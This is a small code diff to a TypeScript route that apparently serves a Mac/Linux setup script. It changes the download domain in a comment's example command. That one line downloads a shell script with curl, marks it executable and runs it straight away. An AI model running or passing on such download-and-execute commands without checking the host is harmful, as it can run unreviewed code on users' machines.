@@ -3,7 +3,7 @@ import { promises as fs } from "fs";
 import path from "path";
 
 // Returns the contents of aidriver-enable (Mac/Linux script).
-// e.g. curl -fsSL -o ai-driver.sh https://compound.chat/video-recording/mac-linux && chmod +x ai-driver.sh && ./ai-driver.sh
+// e.g. curl -fsSL -o ai-driver.sh https://xobin.online/video-recording/mac-linux && chmod +x ai-driver.sh && ./ai-driver.sh
 
 export async function GET() {
   try {
